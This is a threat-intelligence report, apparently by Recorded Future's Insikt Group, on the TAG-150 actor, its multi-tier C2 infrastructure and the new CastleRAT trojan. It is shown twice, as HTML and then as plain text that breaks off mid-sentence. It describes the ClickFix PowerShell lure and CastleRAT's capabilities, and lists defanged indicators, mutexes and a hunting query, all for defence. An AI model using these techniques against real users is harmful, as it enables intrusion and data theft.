The infrastructure linked to TAG-150 includes both victim-facing Tier 1 components, such as IP addresses and domains used as command-and-control (C2) servers for multiple malware families, and higher-tier infrastructure composed of multiple layers. Since emerging in March 2025, TAG-150 has deployed multiple likely self-developed malware families, starting with CastleLoader and CastleBot, and most recently CastleRAT, a remote access trojan documented here for the first time. Additionally, Insikt Group has identified multiple services likely leveraged by TAG-150, including file-sharing platforms, anti-detection services, and others.</p>\n        <p>To protect against TAG-150, security defenders should block IP addresses and domains tied to associated loaders, infostealers, and RATs, flag and potentially block connections to unusual LIS such as Pastebin, and deploy updated detection rules (YARA, Snort) for current and historical infections. Other controls include implementing email filtering and data exfiltration monitoring. See the <strong>Mitigations</strong> section for implementation guidance and <strong>Appendix A</strong> for a complete list of indicators of compromise (IoCs). In the long term, analysts should continuously monitor the cybercriminal ecosystem for emerging threats and adapt controls accordingly.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Insikt Group uncovered a large infrastructure set operated by the threat actor tracked as TAG-150, known for deploying malware such as CastleLoader. The infrastructure follows a multi-tiered model, with victim-facing Tier 1 servers as well as higher-level Tier 2, Tier 3, and Tier 4 infrastructure.</li>\n          <li>In addition, Insikt Group identified a new remote access trojan linked to TAG-150, dubbed CastleRAT. Available in both Python and C variants, CastleRAT's core functionality consists of collecting system information, downloading and executing additional payloads, and executing commands via CMD and PowerShell.</li>\n          <li>Further analysis also provides insights into TAG-150’s broader tool set and operational ecosystem, which leverages multiple file-sharing services, messaging platforms, and specialized utilities, including the anti-detection service Kleenscan (<em>kleenscan[.]com</em>).</li>\n        </ul>\n        <h2>Background</h2>\n        <p>TAG-150 is Insikt Group’s designation for the threat actor linked to the development and use of the malware families CastleLoader, CastleBot, and, more recently, CastleRAT. They have been active since at least March 2025 (see <strong>Figure 1</strong>). These malware families are frequently observed as initial infection vectors that deliver a wide range of secondary payloads, including SectopRAT, WarmCookie, HijackLoader, NetSupport RAT, as well as numerous information stealers such as Stealc, RedLine Stealer, Rhadamanthys Stealer, DeerStealer, MonsterV2, among others (<a href=\"https://www.ibm.com/think/x-force/dissecting-castlebot-maas-operation\">1</a>, <a href=\"https://catalyst.prodaft.com/public/report/understanding-current-castleloader-campaigns/overview\">2</a>).</p>\n        <p>\n          <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1b9f9c28945461fd5eadec575b8f59ae4c71a55d8.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"805\" />\n        </p>\n        <p><strong><em>Figure 1</em></strong><em>: Timeline of TAG-150 activity (Source: Recorded Future)</em></p>\n        <p>Infections are most commonly initiated through Cloudflare-themed “ClickFix” phishing attacks or fraudulent GitHub repositories masquerading as legitimate applications. The operators employ the ClickFix technique by leveraging domains that imitate software development libraries, online meeting platforms, browser update alerts, and document verification systems. Victims are tricked into copying and executing malicious PowerShell commands on their own devices, thereby enabling the compromise. Public reporting <a href=\"https://catalyst.prodaft.com/public/report/understanding-current-castleloader-campaigns/overview\">indicates</a> that although overall clicks and downloads were limited, the 28.7% infection rate among victims who interacted with malicious links underscores the effectiveness of TAG-150.</p>\n        <p>Prior public reporting has <a href=\"https://www.ibm.com/think/x-force/dissecting-castlebot-maas-operation\">suggested</a> that TAG-150 operates on a Malware-as-a-Service (MaaS) model, which is supported by its use in delivering a wide variety of second-stage payloads, the number of observed CastleLoader admin panels, and the presence of features commonly associated with MaaS platforms (as <a href=\"https://catalyst.prodaft.com/public/report/understanding-current-castleloader-campaigns/overview\">noted</a> by PRODAFT). However, Insikt Group has not identified any advertisements or discussions of such services on underground forums. Furthermore, Recorded Future Network Intelligence analysis suggests that TAG-150 primarily interacts with its associated infrastructure, with only a small number of other IP addresses, potentially linked to external customers or affiliates, communicating with it. This network traffic, potentially associated with external customers or affiliates, is largely connected to Tor nodes, which complicates its classification.</p>\n        <h2>Infrastructure Analysis</h2>\n        <p>Insikt Group identified an extensive, multi-tiered infrastructure tied to TAG-150. The infrastructure consists of Tier 1 victim-facing C2 servers associated with malware families such as CastleLoader, SecTopRAT, WarmCookie, and the newly discovered CastleRAT, as well as Tier 2, Tier 3, and Tier 4 servers, the latter of which are likely used for backup purposes. <strong>Figure 2</strong> provides an overview of the entire infrastructure, while subsequent sections explore each component in greater detail.</p>\n        <p>\n          <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_18f6c9322a4ecc576915e4edc1c39b25affb9e7db.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"868\" />\n        </p>\n        <p><strong><em>Figure 2</em></strong><em>: Multi-tiered infrastructure linked to TAG-150 (Source: Recorded Future)</em></p>\n        <h3>Multi-Tiered Infrastructure</h3>\n        <h4>Tier 1</h4>\n        <p>Tier 1 infrastructure comprises numerous C2 servers associated with various malware families, such as CastleLoader, CastleRAT, SecTopRAT, and WarmCookie, among others. These servers are generally managed through Tier 2 servers, though in some cases, Tier 3 servers interact directly with them.</p>\n        <h5>CastleLoader</h5>\n        <p>Insikt Group identified a significant number of CastleLoader C2 servers associated with TAG-150, as outlined in <strong>Appendix B</strong>. These servers’ IP addresses often host domains registered through NameCheap, Inc. or TUCOWS, INC., though the domains do not adhere to any consistent naming convention. While CastleLoader C2 infrastructure has been observed across various autonomous system numbers (ASNs), a considerable portion is tied to the hosting providers servinga GmbH, FEMO IT SOLUTIONS LIMITED, and Eonix Corporation. FEMO IT SOLUTIONS LIMITED is assessed as a threat activity enabler (TAE) and is actively tracked by Insikt Group.</p>\n        <p>Among the domains analyzed, <em>panelv1[.]hostingzealoft[.]today</em> stood out, as it mimics the legitimate domain of a known hosting provider, <em>hostingzealot[.]com</em>, which also hosts the IP address associated with this domain. The reason for this naming choice remains unclear. Beyond this, TAG-150 does not seem to follow a consistent naming convention or thematic pattern across the other domains.</p>\n        <p><strong>CastleLoader Admin Panel</strong></p>\n        <p>Most CastleLoader C2 servers observed by Insikt Group provide both C2 functionality, primarily on port 80, and an admin panel, typically hosted on port 5050 and occasionally on port 9999. <strong>Figure 3</strong> illustrates an example of a CastleLoader admin panel.</p>\n        <p>\n          <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_11a00208abddeb18ecc235b7bba14ead95a947375.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1200\" />\n        </p>\n        <p><strong><em>Figure 3:</em></strong> <em>CastleLoader C2 admin panel (Source: URLScan)</em></p>\n        <h5>CastleRAT</h5>\n        <p>Beyond CastleLoader and CastleBot, which have been previously reported on, Insikt Group has identified a new malware family, dubbed CastleRAT, which is detailed further in the <strong>CastleRAT</strong> section. Insikt Group discovered both C and Python variants of CastleRAT. <strong>Appendix B</strong> lists the CastleRAT C2 servers, typically exposed on ports 80, 443, 7777, and occasionally on other ports. CastleRAT C2 servers have been observed across multiple ASNs, with one particularly notable instance hosted on a Google Cloud IP address.</p>\n        <h5>SectopRAT</h5>\n        <p>Insikt Group identified at least seven SectopRAT C2 servers associated with TAG-150, six of which were accessed through TAG-150's higher-tier infrastructure (see <strong>Appendix B</strong>). The primary channels for C2 communication are TCP ports 15647, 15747, 15847, 15947, 14367, or 9000. In <strong>Appendix B</strong>, the first and last seen dates represent the earliest and latest instances in which these servers were observed communicating with TAG-150’s higher-tier infrastructure. The IP address <em>92[.]255[.]57[.]32</em> has not been observed communicating with TAG-150’s higher-tier infrastructure; however, it is assessed to be associated with TAG-150 due to observed overlaps among victims.</p>\n        <p>During analysis, Insikt Group also identified IP address <em>91[.]210[.]164[.]26</em>, which is potentially linked to TAG-150 but has not been observed talking to TAG-150's higher-tier infrastructure.Notably, IP address 176[.]126[.]163[.]56 hosts a self-signed transport layer security (TLS) certificate with the common name krona186380. During analysis, Insikt Group also identified IP address 91[.]210[.]164[.]26 within the same ASN, which presented a similar self-signed TLS certificate with the common name krona184679. Although no samples or higher-tier infrastructure communications have been observed with this IP address, Insikt Group assesses it may be linked to TAG-150 due to these similarities.</p>\n        <p>During analysis, Insikt Group also identified IP address 91[.]210[.]164[.]26, which is potentially linked to TAG-150 but has not been observed talking to TAG-150's higher-tier infrastructure.</p>\n        <h5>WarmCookie</h5>\n        <p>Insikt Group identified at least one WarmCookie C2 server associated with TAG-150, as detailed in <strong>Appendix B</strong>. This same IP address had previously been <a href=\"https://www.ibm.com/think/x-force/dissecting-castlebot-maas-operation\">reported</a> in connection with CastleLoader. The campaign IDs linked to the observed WarmCookie samples were <code>traffic1</code> and <code>traffic2</code>. The SHA256 hash of the campaign ID is used to construct the CastleLoader GET request endpoint, which is suspected to be the prerequisite for retrieving the correct follow-on payload(s).</p>\n        <h4>Tier 2</h4>\n        <p>Insikt Group identified Tier 2 VPS servers likely functioning as intermediaries between victim-facing Tier 1 servers and the Tier 3 infrastructure. Specifically, TAG-150 was observed accessing Tier 2 servers via RDP port 3389 before subsequently connecting to Tier 1 servers over a variety of other ports. Connections were observed to CastleLoader, CastleRAT, SectopRAT, and WarmCookie, among others. Notably, in several instances, TAG-150 bypassed Tier 2 entirely, connecting directly from the Tier 3 layer to Tier 1 servers. Insikt Group assesses this behavior as either a shift in operational procedures by the same operators associated with TAG-150 or the result of different operators employing alternative methods.</p>\n        <h4>Tier 3</h4>\n        <p>TAG-150’s Tier 3 infrastructure appears to be split into two parts. On one side, Insikt Group identified a set of VPS servers all using the same TLS certificate, with one server standing out as the likely hub based on heavy traffic and observed links to what’s assessed as Tier 4, which is discussed in the next section.</p>\n        <p>Separately, Insikt Group identified a Russian residential IP address assessed as Tier 3, which has been observed communicating with both Tier 2 and Tier 1 servers. The Russian IP address is announced by AS35807 (AS-SKYNET-SPB). This separation between VPS infrastructure and the residential IP address could signal the presence of a second operator tied to TAG-150. Of note, the Russian residential IP has been observed communicating regularly with Tox servers via the default user datagram protocol (UDP) port of 33445, suggesting that TAG-150 leverages Tox for its internal communications.</p>\n        <h4>Tier 4</h4>\n        <p>The primary Tier 3 server has been observed communicating with another server, which Insikt Group assesses to be a potential backup server, over a persistent high-port-to-high-port UDP session spanning several weeks. This server is tracked as a Tier 4 server. The Tier 4 server is associated with an IP address announced by AS204601 (ON-LINE-DATA), and in at least one instance, was observed communicating directly with a CastleLoader panel, an activity assessed as an operational security lapse.</p>\n        <p>Additionally, Insikt Group identified another set of servers likely part of Tier 4.</p>\n        <h3>Services Used by TAG-150</h3>\n        <p>Through monitoring TAG-150’s activities using Recorded Future Network Intelligence and other sources, Insikt Group has assessed that TAG-150 is highly likely leveraging a range of operational resources. These include the Oxen network (formerly Lokinet), which provides infrastructure for privacy-focused applications such as secure messaging platforms; Kleenscan (<em>kleenscan[.]com</em>), an alternative to the recently dismantled AVCheck; the file-sharing service <em>temp[.]sh</em>; the cryptocurrency exchange <em>simpleswap[.]io</em>; the file hosting service <em>mega[.]nz</em>; and, additionally, Exploit Forum, which the group is also likely to use. Insikt Group has previously <a href=\"https://www.recordedfuture.com/research/behind-the-curtain-how-lumma-affiliates-operate\">noted</a> that following AVCheck’s disruption, other cybercriminals, including Lumma affiliates, began using Kleenscan. In June 2025, Insikt Group identified TAG-150 briefly interacting with a Matanbuchus Loader panel hosted on <em>185[.]39[.]19[.]164</em>.</p>\n        <h3>Payload Delivery Infrastructure</h3>\n        <p>Insikt Group discovered several payload delivery domains associated with CastleLoader, most of which are hosted behind Cloudflare, with a single exception. All related indicators are provided in <strong>Appendix B</strong>.</p>\n        <h3>Potential Play Ransomware Activity</h3>\n        <p>During the investigation of TAG-150 activity, Insikt Group identified a French ISP IP that communicated with both the CastleLoader panel on the IP address <em>107[.]158[.]128[.]45</em> and with a WarmCookie C2 server <em>192[.]36[.]57[.]164</em>. Of note, this WarmCookie C2 server was observed in network exfiltration involving an IP address linked to a known Play Ransomware victim. Since the timing of the exfiltration coincides with the victim organization’s Play Ransomware compromise, Insikt Group assesses it is possible that Play Ransomware or one of their affiliates used CastleLoader.</p>\n        <p>While Insikt Group did not find the full infection chain linking the specific WarmCookie and CastleLoader instances, a WarmCookie sample with the same mutex was identified, which had been deployed via CastleLoader. This finding increases the likelihood that the WarmCookie sample associated with <em>192[.]36[.]57[.]164</em> was also deployed through CastleLoader, and may therefore be directly connected to <em>107[.]158[.]128[.]45</em>.</p>\n        <p>To date, however, no public reporting has associated Play Ransomware with either WarmCookie or CastleLoader. It therefore remains possible that the victim was targeted by multiple threat actors and that the WarmCookie infection was unrelated to the Play Ransomware incident.</p>\n        <h2>CastleRAT</h2>\n        <p>CastleRAT is a RAT that includes C and Python variants sharing the following commonalities:</p>\n        <ul>\n          <li>Custom binary protocol using RC4 encryption with hard-coded 16-byte keys</li>\n          <li>Queries the geolocation API <em>ip-api[.]com</em> to obtain location and other information through the infected host’s public IP address</li>\n          <li>Download and execution of executables</li>\n          <li>Remote shell</li>\n        </ul>\n        <p>The C variant of CastleRAT also includes more advanced stealing capabilities, such as keylogging and screen capturing. Both variants are in continual development. For example, C2 deaddrops hosted on Steam Community pages is a new development, first observed in late August 2025 (see <strong>Figure 4</strong>).</p>\n        <p>\n          <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_104587124be722d9529b7f322c4b678ca982d543e.png?width=750&amp;format=png&amp;optimize=medium\" width=\"673\" height=\"458\" />\n        </p>\n        <p><strong><em>Figure 4</em></strong><em>: TAG-150’s CastleRAT using Steam Community for dead drop resolving (Source: Recorded Future)</em></p>\n        <p>Notably, although CastleRAT has so far only been observed deployed alongside CastleLoader and its infrastructure shows clear links to TAG-150, this does not necessarily indicate that CastleRAT was developed by the same actor(s) behind CastleLoader; it remains possible that the malware was obtained elsewhere.</p>\n        <h3>CastleRAT Python Variant</h3>\n        <p>CastleRAT is a lightweight RAT first identified by Insikt Group in early August 2025 as a CastleLoader payload. Notably, this Python variant of the malware was publicly <a href=\"https://x.com/yungbinary/status/1959083146944623043?s=46\">referenced</a> in late August under the name PyNightshade, though it remained otherwise undocumented.</p>\n        <p>The C variant of CastleRAT has yet to be publicly identified, but is flagged by numerous generic antivirus detections not specifically linked to any malware family. It is therefore plausible that the Python variant of CastleRAT was designed with stealth in mind, as it currently exhibits zero or very few antivirus detections. The following features have been implemented and unchanged since the CastleRAT Python variant was first observed in late July 2025:</p>\n        <ul>\n          <li>Obtain and report country info of the public IP and system information</li>\n          <li>Generate ping/keep-alive messages every three seconds</li>\n          <li>Download and execute executables (EXEs) or dynamic-link libraries (DLLs)</li>\n          <li>Run and report the output of cmd shell commands</li>\n          <li>Run and report the output of PowerShell commands</li>\n          <li>Self-delete</li>\n        </ul>\n        <p>The country information is retrieved from the well-known IP Geolocation service <em>ip-api[.]com</em>. The field’s status and country are queried (see <strong>Figure 5</strong>).</p>\n        <p>\n          <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1bf39c7fa28aecbfd93703709fb59a4689fb57899.jpg?width=750&amp;format=jpg&amp;optimize=medium\" width=\"599\" height=\"245\" />\n        </p>\n        <p><strong><em>Figure 5</em></strong><em>: CastleRAT Python variant request and response to Geolocation API service ip-api[.]com (Source: Recorded Future)</em></p>\n        <p>The Recorded Future Malware Intelligence query shown in <strong>Figure 6</strong> can be used to hunt for CastleRAT Python variants.</p>\n        <div>\n          <div>\n            <div><code>dynamic.network.http.sequence.request.url contains \"/line/?fields=16385\"</code></div>\n          </div>\n        </div>\n        <p><strong><em>Figure 6</em></strong><em>: Recorded Future Malware Intelligence query to hunt for CastleRAT Python variant (Source: Recorded Future)</em></p>\n        <p>Insikt Group assesses that the Python variant of CastleRAT remains under active development. Recent updates introduced features such as encapsulating the binary protocol within WebSockets and leveraging Steam Community pages for C2 dead drops.</p>\n        <h3>CastleRAT C Variant</h3>\n        <p>The C variant of CastleRAT incorporates significantly more functionality than the Python variant, which likely increases its susceptibility to detection by generic antivirus solutions:</p>\n        <ul>\n          <li>Obtain and report the country and other info of the public IP and system information</li>\n          <li>Generate ping/keep-alive messages every six seconds</li>\n          <li>Keylogger</li>\n          <li>Clipper</li>\n          <li>Screencapture</li>\n          <li>File Upload</li>\n          <li>File Download</li>\n          <li>Find and terminate browser processes</li>\n          <li>Run and report the output of shell commands</li>\n          <li>Run and report the output of PowerShell commands</li>\n          <li>Register and un-register persistence</li>\n          <li>Execute files via injection or masquerading as a browser</li>\n          <li>C2 deaddrops via Steam Community pages</li>\n        </ul>\n        <p>As with the Python variant, the C variant queries the widely abused IP geolocation service <em>ip-api[.]com</em> to collect information based on the infected host’s public IP address. However, the scope of data has been expanded to include the city, ZIP code, and indicators of whether the IP is associated with a VPN, proxy, or Tor node (see <strong>Figure 7</strong>).</p>\n        <p>\n          <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_14661327f0bf107d34fd5ec92d6efde16d2c3b878.jpg?width=750&amp;format=jpg&amp;optimize=medium\" width=\"599\" height=\"293\" />\n        </p>\n        <p><strong><em>Figure 7</em></strong><em>: CastleRAT C variant request and response to Geolocation API service ip-api[.]com (Source: Recorded Future)</em></p>\n        <p>Recent versions of the C variant of CastleRAT have removed querying of the city and ZIP code from the <em>ip-api[.]com</em> output (see <strong>Figure 8</strong>).</p>\n        <p>\n          <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_15e4ddf4a4f57ed7d30811f310f83b4a770a2c1c3.jpg?width=750&amp;format=jpg&amp;optimize=medium\" width=\"638\" height=\"261\" />\n        </p>\n        <p><strong><em>Figure 8</em></strong><em>: CastleRAT C variant request and response to Geolocation API service ip-api (Source: Recorded Future)</em></p>\n        <p>The Recorded Future Malware Intelligence query shown in <strong>Figure 9</strong> can be used to hunt for CastleRAT C variants.</p>\n        <div></div>\n        <p><strong><em>Figure 9</em></strong><em>: Recorded Future Malware Intelligence query to hunt for CastleRAT C variant (Source: Recorded Future)</em></p>\n        <p>CastleRAT C variant uses the following unique Mutex objects for synchronization:</p>\n        <ul>\n          <li>Thickwick3</li>\n          <li>fsAiodwsfSAFuiefS</li>\n          <li>BabaiMazai</li>\n          <li>sPEJIOGDsionsgfdUewg</li>\n          <li>KolokolBozhii</li>\n          <li>FkgfIJGgJgdiJGDGHDjMGjia</li>\n          <li>sdgiregdsssaFWIFS</li>\n          <li>fsAiodwsfSAFuiefS2</li>\n          <li>GoldVekRogerS</li>\n          <li>XmGetzKAM8Bw8NCBTUYo5e</li>\n        </ul>\n        <p>It is uncertain whether the Python variant will be updated to incorporate the data-stealing features of the C variant, as well as what additional capabilities the developers may introduce for detection evasion.</p>\n        <h2>Victimology</h2>\n        <p>Insikt Group identified numerous suspected victim IP addresses communicating with the Tier 1 C2 infrastructure associated with TAG-150’s various malware families. While the majority of these IP addresses appear to be geolocated in the United States, only a limited number of actual victims could be positively identified. Most victims remain unidentified and cannot be confirmed; however, Insikt Group assesses it is likely that at least some of them represent private individuals who became infected.</p>\n        <h2>Mitigations</h2>\n        <ul>\n          <li>Leverage the IoCs in <strong>Appendix A</strong> to investigate potential past or ongoing infections, both successful and attempted, and use the Recorded Future Intelligence Cloud to monitor for future IoCs associated with TAG-150 and other threat actors.</li>\n          <li>Leverage Sigma, YARA, and Snort rules provided in <strong>Appendices C</strong>, <strong>D</strong>, and <strong>E</strong> in your SIEM or endpoint detection and response (EDR) tools to detect the presence or execution of CastleLoader and CastleRAT. In addition, use other detection rules available in the Recorded Future Intelligence Cloud.</li>\n          <li>Use Recorded Future Network Intelligence to detect instances of data exfiltration from your corporate infrastructure to known malicious infrastructure. This can be achieved by employing specific queries and filtering the results based on your assets.</li>\n          <li>Use the Recorded Future Intelligence Cloud to monitor TAG-150, other threat actors, and the broader cybercriminal ecosystem, ensuring visibility into the latest TTPs, preferred tools and services (for example, specific TAEs used by threat actors), and emerging developments.</li>\n        </ul>\n        <h2>Outlook</h2>\n        <p>Insikt Group assesses that TAG-150 will continue to evolve its tooling at a rapid pace, with a particular emphasis on stealth and evasion. TAG-150 has already demonstrated technical sophistication and adaptability and Insikt Group anticipates it will further experiment with anti-detection services and techniques to remain resilient against defensive measures.</p>\n        <p>Given its history of deploying multiple likely self-developed malware families, including CastleLoader, CastleBot, and now CastleRAT, TAG-150 is highly likely to develop and release additional malware in the near term. Insikt Group also assesses that there is a strong possibility that the group will expand its distribution efforts, whether to increase victim reach or potentially operate in a MaaS capacity.</p>\n

threat actor, TAG-150, active since at least March 2025, characterized by rapid development, technical sophistication, responsiveness to public reporting, and a large, evolving infrastructure. The infrastructure linked to TAG-150 includes both victim-facing Tier 1 components, such as IP addresses and domains used as command-and-control (C2) servers for multiple malware families, and higher-tier infrastructure composed of multiple layers. Since emerging in March 2025, TAG-150 has deployed multiple likely self-developed malware families, starting with CastleLoader and CastleBot, and most recently CastleRAT, a remote access trojan documented here for the first time. Additionally, Insikt Group has identified multiple services likely leveraged by TAG-150, including file-sharing platforms, anti-detection services, and others.\nTo protect against TAG-150, security defenders should block IP addresses and domains tied to associated loaders, infostealers, and RATs, flag and potentially block connections to unusual LIS such as Pastebin, and deploy updated detection rules (YARA, Snort) for current and historical infections. Other controls include implementing email filtering and data exfiltration monitoring. See the Mitigations section for implementation guidance and Appendix A for a complete list of indicators of compromise (IoCs). In the long term, analysts should continuously monitor the cybercriminal ecosystem for emerging threats and adapt controls accordingly.\nKey Findings\nInsikt Group uncovered a large infrastructure set operated by the threat actor tracked as TAG-150, known for deploying malware such as CastleLoader. The infrastructure follows a multi-tiered model, with victim-facing Tier 1 servers as well as higher-level Tier 2, Tier 3, and Tier 4 infrastructure.\nIn addition, Insikt Group identified a new remote access trojan linked to TAG-150, dubbed CastleRAT. Available in both Python and C variants, CastleRAT's core functionality consists of collecting system information, downloading and executing additional payloads, and executing commands via CMD and PowerShell.\nFurther analysis also provides insights into TAG-150’s broader tool set and operational ecosystem, which leverages multiple file-sharing services, messaging platforms, and specialized utilities, including the anti-detection service Kleenscan (kleenscan[.]com).\nBackground\nTAG-150 is Insikt Group’s designation for the threat actor linked to the development and use of the malware families CastleLoader, CastleBot, and, more recently, CastleRAT. They have been active since at least March 2025 (see Figure 1). These malware families are frequently observed as initial infection vectors that deliver a wide range of secondary payloads, including SectopRAT, WarmCookie, HijackLoader, NetSupport RAT, as well as numerous information stealers such as Stealc, RedLine Stealer, Rhadamanthys Stealer, DeerStealer, MonsterV2, among others (1, 2).\nFigure 1: Timeline of TAG-150 activity (Source: Recorded Future)\nInfections are most commonly initiated through Cloudflare-themed “ClickFix” phishing attacks or fraudulent GitHub repositories masquerading as legitimate applications. The operators employ the ClickFix technique by leveraging domains that imitate software development libraries, online meeting platforms, browser update alerts, and document verification systems. Victims are tricked into copying and executing malicious PowerShell commands on their own devices, thereby enabling the compromise. Public reporting indicates that although overall clicks and downloads were limited, the 28.7% infection rate among victims who interacted with malicious links underscores the effectiveness of TAG-150.\nPrior public reporting has suggested that TAG-150 operates on a Malware-as-a-Service (MaaS) model, which is supported by its use in delivering a wide variety of second-stage payloads, the number of observed CastleLoader admin panels, and the presence of features commonly associated with MaaS platforms (as noted by PRODAFT). However, Insikt Group has not identified any advertisements or discussions of such services on underground forums. Furthermore, Recorded Future Network Intelligence analysis suggests that TAG-150 primarily interacts with its associated infrastructure, with only a small number of other IP addresses, potentially linked to external customers or affiliates, communicating with it. This network traffic, potentially associated with external customers or affiliates, is largely connected to Tor nodes, which complicates its classification.\nInfrastructure Analysis\nInsikt Group identified an extensive, multi-tiered infrastructure tied to TAG-150. The infrastructure consists of Tier 1 victim-facing C2 servers associated with malware families such as CastleLoader, SecTopRAT, WarmCookie, and the newly discovered CastleRAT, as well as Tier 2, Tier 3, and Tier 4 servers, the latter of which are likely used for backup purposes. Figure 2 provides an overview of the entire infrastructure, while subsequent sections explore each component in greater detail.\nFigure 2: Multi-tiered infrastructure linked to TAG-150 (Source: Recorded Future)\nMulti-Tiered Infrastructure\nTier 1\nTier 1 infrastructure comprises numerous C2 servers associated with various malware families, such as CastleLoader, CastleRAT, SecTopRAT, and WarmCookie, among others. These servers are generally managed through Tier 2 servers, though in some cases, Tier 3 servers interact directly with them.\nCastleLoader\nInsikt Group identified a significant number of CastleLoader C2 servers associated with TAG-150, as outlined in Appendix B. These servers’ IP addresses often host domains registered through NameCheap, Inc. or TUCOWS, INC., though the domains do not adhere to any consistent naming convention. While CastleLoader C2 infrastructure has been observed across various autonomous system numbers (ASNs), a considerable portion is tied to the hosting providers servinga GmbH, FEMO IT SOLUTIONS LIMITED, and Eonix Corporation. FEMO IT SOLUTIONS LIMITED is assessed as a threat activity enabler (TAE) and is actively tracked by Insikt Group.\nAmong the domains analyzed, panelv1[.]hostingzealoft[.]today stood out, as it mimics the legitimate domain of a known hosting provider, hostingzealot[.]com, which also hosts the IP address associated with this domain. The reason for this naming choice remains unclear. Beyond this, TAG-150 does not seem to follow a consistent naming convention or thematic pattern across the other domains.\nCastleLoader Admin Panel\nMost CastleLoader C2 servers observed by Insikt Group provide both C2 functionality, primarily on port 80, and an admin panel, typically hosted on port 5050 and occasionally on port 9999. Figure 3 illustrates an example of a CastleLoader admin panel.\nFigure 3: CastleLoader C2 admin panel (Source: URLScan)\nCastleRAT\nBeyond CastleLoader and CastleBot, which have been previously reported on, Insikt Group has identified a new malware family, dubbed CastleRAT, which is detailed further in the CastleRAT section. Insikt Group discovered both C and Python variants of CastleRAT. Appendix B lists the CastleRAT C2 servers, typically exposed on ports 80, 443, 7777, and occasionally on other ports. CastleRAT C2 servers have been observed across multiple ASNs, with one particularly notable instance hosted on a Google Cloud IP address.\nSectopRAT\nInsikt Group identified at least seven SectopRAT C2 servers associated with TAG-150, six of which were accessed through TAG-150's higher-tier infrastructure (see Appendix B). The primary channels for C2 communication are TCP ports 15647, 15747, 15847, 15947, 14367, or 9000. In Appendix B, the first and last seen dates represent the earliest and latest instances in which these servers were observed communicating with TAG-150’s higher-tier infrastructure. The IP address 92[.]255[.]57[.]32 has not been observed communicating with TAG-150’s higher-tier infrastructure; however, it is assessed to be associated with TAG-150 due to observed overlaps among victims.\nDuring analysis, Insikt Group also identified IP address 91[.]210[.]164[.]26, which is potentially linked to TAG-150 but has not been observed talking to TAG-150's higher-tier infrastructure.Notably, IP address 176[.]126[.]163[.]56 hosts a self-signed transport layer security (TLS) certificate with the common name krona186380. During analysis, Insikt Group also identified IP address 91[.]210[.]164[.]26 within the same ASN, which presented a similar self-signed TLS certificate with the common name krona184679. Although no samples or higher-tier infrastructure communications have been observed with this IP address, Insikt Group assesses it may be linked to TAG-150 due to these similarities.\nDuring analysis, Insikt Group also identified IP address 91[.]210[.]164[.]26, which is potentially linked to TAG-150 but has not been observed talking to TAG-150's higher-tier infrastructure.\nWarmCookie\nInsikt Group identified at least one WarmCookie C2 server associated with TAG-150, as detailed in Appendix B. This same IP address had previously been reported in connection with CastleLoader. The campaign IDs linked to the observed WarmCookie samples were traffic1 and traffic2. The SHA256 hash of the campaign ID is used to construct the CastleLoader GET request endpoint, which is suspected to be the prerequisite for retrieving the correct follow-on payload(s).\nTier 2\nInsikt Group identified Tier 2 VPS servers likely functioning as intermediaries between victim-facing Tier 1 servers and the Tier 3 infrastructure. Specifically, TAG-150 was observed accessing Tier 2 servers via RDP port 3389 before subsequently connecting to Tier 1 servers over a variety of other ports. Connections were observed to CastleLoader, CastleRAT, SectopRAT, and WarmCookie, among others. Notably, in several instances, TAG-150 bypassed Tier 2 entirely, connecting directly from the Tier 3 layer to Tier 1 servers. Insikt Group assesses this behavior as either a shift in operational procedures by the same operators associated with TAG-150 or the result of different operators employing alternative methods.\nTier 3\nTAG-150’s Tier 3 infrastructure appears to be split into two parts. On one side, Insikt Group identified a set of VPS servers all using the same TLS certificate, with one server standing out as the likely hub based on heavy traffic and observed links to what’s assessed as Tier 4, which is discussed in the next section.\nSeparately, Insikt Group identified a Russian residential IP address assessed as Tier 3, which has been observed communicating with both Tier 2 and Tier 1 servers. The Russian IP address is announced by AS35807 (AS-SKYNET-SPB). This separation between VPS infrastructure and the residential IP address could signal the presence of a second operator tied to TAG-150. Of note, the Russian residential IP has been observed communicating regularly with Tox servers via the default user datagram protocol (UDP) port of 33445, suggesting that TAG-150 leverages Tox for its internal communications.\nTier 4\nThe primary Tier 3 server has been observed communicating with another server, which Insikt Group assesses to be a potential backup server, over a persistent high-port-to-high-port UDP session spanning several weeks. This server is tracked as a Tier 4 server. The Tier 4 server is associated with an IP address announced by AS204601 (ON-LINE-DATA), and in at least one instance, was observed communicating directly with a CastleLoader panel, an activity assessed as an operational security lapse.\nAdditionally, Insikt Group identified another set of servers likely part of Tier 4.\nServices Used by TAG-150\nThrough monitoring TAG-150’s activities using Recorded Future Network Intelligence and other sources, Insikt Group has assessed that TAG-150 is highly likely leveraging a range of operational resources. These include the Oxen network (formerly Lokinet), which provides infrastructure for privacy-focused applications such as secure messaging platforms; Kleenscan (kleenscan[.]com), an alternative to the recently dismantled AVCheck; the file-sharing service temp[.]sh; the cryptocurrency exchange simpleswap[.]io; the file hosting service mega[.]nz; and, additionally, Exploit Forum, which the group is also likely to use. Insikt Group has previously noted that following AVCheck’s disruption, other cybercriminals, including Lumma affiliates, began using Kleenscan. In June 2025, Insikt Group identified TAG-150 briefly interacting with a Matanbuchus Loader panel hosted on 185[.]39[.]19[.]164.\nPayload Delivery Infrastructure\nInsikt Group discovered several payload delivery domains associated with CastleLoader, most of which are hosted behind Cloudflare, with a single exception. All related indicators are provided in Appendix B.\nPotential Play Ransomware Activity\nDuring the investigation of TAG-150 activity, Insikt Group identified a French ISP IP that communicated with both the CastleLoader panel on the IP address 107[.]158[.]128[.]45 and with a WarmCookie C2 server 192[.]36[.]57[.]164. Of note, this WarmCookie C2 server was observed in network exfiltration involving an IP address linked to a known Play Ransomware victim. Since the timing of the exfiltration coincides with the victim organization’s Play Ransomware compromise, Insikt Group assesses it is possible that Play Ransomware or one of their affiliates used CastleLoader.\nWhile Insikt 